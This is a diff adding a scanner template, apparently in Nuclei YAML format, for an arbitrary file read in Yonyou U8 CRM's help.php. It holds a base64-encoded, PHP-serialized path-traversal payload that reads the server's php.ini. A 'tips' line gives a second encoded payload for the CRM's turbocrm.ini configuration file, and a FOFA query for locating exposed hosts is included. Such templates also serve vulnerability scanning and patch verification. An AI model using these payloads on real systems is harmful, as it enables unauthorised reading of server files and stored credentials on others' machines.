@@ -1,0 +1,26 @@
+id: yonyou-u8-crm-help-fileread
+info:
+  name: 用友 U8 CRM help.php - fileread
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/wy876/POC/blob/c19942e30121f116548ca14c0375ba6c8560afeb/%E7%94%A8%E5%8F%8Bcrm%E5%AE%A2%E6%88%B7%E5%85%B3%E7%B3%BB%E7%AE%A1%E7%90%86help.php%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    fofa-query: app="用友U8CRM"
+    tips: can also read this YToxOntpOjA7czozMDoiLy4uLy4uLy4uLy4uL3RzdnIvdHVyYm9jcm0uaW5pIjt9
+  tags: yonyou,u8crm,crm,fileread,oa
+
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/pub/help.php?key=YTozOntpOjA7czoyNDoiLy4uLy4uLy4uL2FwYWNoZS9waHAuaW5pIjtpOjE7czoxOiIxIjtpOjI7czoxOiIyIjt9"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body,'php.ini')
+        condition: and
